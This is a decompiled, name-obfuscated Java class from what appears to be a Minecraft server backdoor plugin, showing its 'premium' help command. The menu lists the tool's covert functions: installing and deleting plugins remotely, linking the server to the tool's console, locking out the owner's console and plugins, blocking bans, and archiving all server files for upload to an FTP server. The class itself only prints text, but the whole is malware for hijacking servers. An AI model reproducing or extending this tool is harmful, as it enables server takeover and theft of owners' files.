/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.ChatColor
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.help;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.methods.Tips;
import me.system.runner.utils.Settings;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class PremiumhelpCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllIIllllIIIIIIIlllIIl, String lllllllllllllIIllllIIIIIIIlllIII, String[] lllllllllllllIIllllIIIIIIIllIlll, Player lllllllllllllIIllllIIIIIIIllIIll) {
        int lllllllllllllIIllllIIIIIIIllIlIl = 1;
        if (lllllllllllllIIllllIIIIIIIllIlll.length <= 1) {
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(Settings.USAGE(String.valueOf(new StringBuilder().append("premhelp <1-").append(lllllllllllllIIllllIIIIIIIllIlIl).append(">"))));
        } else if (lllllllllllllIIllllIIIIIIIllIlll[1].equalsIgnoreCase("1")) {
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(String.valueOf(new StringBuilder().append("         ").append(Settings.DARK_RED).append(Settings.NAME).append(" by ").append("Wendellmeset")));
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage("");
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7install &8l &fInstalls another plugin and enables it"));
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&7consoleconnect &8l &fConnect server to ").append(Settings.NAME).append(" console"))));
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7delplugin &8l &fDeletes a plugin from the plugins folder"));
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&7theme &8l &fChange your ").append(Settings.NAME).append(" theme"))));
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7setpass &8l &fSet a password to login"));
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7clearpass &8l &fMake it so you dont need a password to login"));
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7checkpass &8l &fCheck what the password is"));
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7disableLock &8l &fDisable a plugin even if server restarts"));
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7enableLock &8l &fReverses the effects of disableLock"));
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7setprefix &8l &fChange your server chat prefix"));
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7secure &8l &fLock console, cmds and disable plugins"));
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7autounban &8l &fPrevents anyone on or off the server from being banned or kicked!"));
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7filedownload &8l &fArchives all server files into one zip and uploads to a FTP server!! (May not work!)"));
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage("");
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&8(").append(Settings.DARK_RED).append("Tip&8) l &7").append(Tips.getTip()))));
            lllllllllllllIIllllIIIIIIIllIIll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    public PremiumhelpCommand() {
        PremiumhelpCommand lllllllllllllIIllllIIIIIIIllllll;
    }
}

